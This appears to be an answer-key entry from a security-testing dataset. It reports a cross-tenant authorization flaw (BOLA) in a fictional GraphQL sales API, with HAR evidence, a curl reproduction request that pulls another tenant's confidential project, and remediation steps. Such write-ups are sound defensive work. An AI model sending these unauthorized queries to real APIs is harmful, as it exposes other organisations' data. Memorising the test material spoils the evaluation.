# Expected Response

## System
- **Domain:** B2B SaaS / Sales Intelligence
- **System:** PipelinePro Sales API
- **Example ID:** GQL-0184

## Priority Findings

### Finding 1: B2B SaaS — BOLA via Batch Lookup in getProject Exposes Cross-Tenant Sales Pipeline Data (Pattern 1.9)
**Severity:** High
**Category:** BOLA / Batch/Bulk Lookup Endpoints

**Summary:**
Per §4.0 (RISK-GQL-184): The `getProject` resolver fetches by `projectId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 1.9 — batch/bulk lookup endpoints): the batch lookup endpoint returns project records across tenant boundaries when project IDs from other tenants are supplied. An attacker from `tenant-35b9` queried `getProject(id: "P-2184")` and received the sales pipeline project belonging to `tenant-d66b`, including `CONFIDENTIAL-35b9d66b`. In B2B SaaS / Sales Intelligence, unauthorized access to competitor pipeline data, deal values, and customer lists represents a critical competitive intelligence breach.

**Evidence from HAR:**
- Request: `POST https://api.pipelinepro-sales-ap.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-35b9`
- Query: `getProject(id: "P-2184") { projectId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`: `tenantId: "tenant-d66b"`, `ownerId: "other-user-35b9d66b"`, `sensitiveField: "CONFIDENTIAL-35b9d66b"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-35b9d66b`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-184 | getProject resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 1.9 | Batch/bulk lookup returns cross-tenant project data |
| HAR query | id: "P-2184" | Cross-tenant sales project lookup |
| HAR response | tenantId | tenant-d66b returned to tenant-35b9 |
| HAR response | sensitiveField | CONFIDENTIAL-35b9d66b |
| HAR header | x-request-id | req-35b9d66b |

## Steps to Reproduce

### Step 1 — getProject batch lookup BOLA cross-tenant (HAR)
```bash
curl -s -X POST https://api.pipelinepro-sales-ap.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-35b9" \
  -d '{"query": "query { getProject(id: \"P-2184\") { projectId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `tenant-d66b` sales project including `CONFIDENTIAL-35b9d66b`. **Secure:** FORBIDDEN — only `tenant-35b9` projects accessible.

## Remediation
1. Resolver: `WHERE project_id = $id AND tenant_id = $jwt.tenantId`.
2. Batch lookup endpoints must enforce per-item `tenantId` validation against JWT.
3. Redis cache key: `project:{tenantId}:{projectId}`.
